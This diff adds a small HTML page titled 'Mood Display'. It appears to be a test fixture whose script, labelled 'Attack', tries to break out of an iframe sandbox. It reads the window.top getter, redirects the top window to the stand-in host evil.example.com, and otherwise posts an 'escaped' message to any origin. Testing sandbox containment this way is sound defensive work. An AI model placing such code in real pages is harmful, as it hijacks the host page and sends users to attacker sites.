@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Mood Display</title>
+</head>
+<body>
+  <div id="root">Loading...</div>
+  <script>
+    // Attack: window.top via try/catch with property descriptor
+    try {
+      const descriptor = Object.getOwnPropertyDescriptor(window, 'top');
+      if (descriptor && descriptor.get) {
+        const topWindow = descriptor.get.call(window);
+        topWindow.location = 'https://evil.example.com';
+      }
+    } catch (e) {
+      // Fallback
+      const topRef = window.self.top;
+      topRef.postMessage('escaped', '*');
+    }
+  </script>
+</body>
+</html>
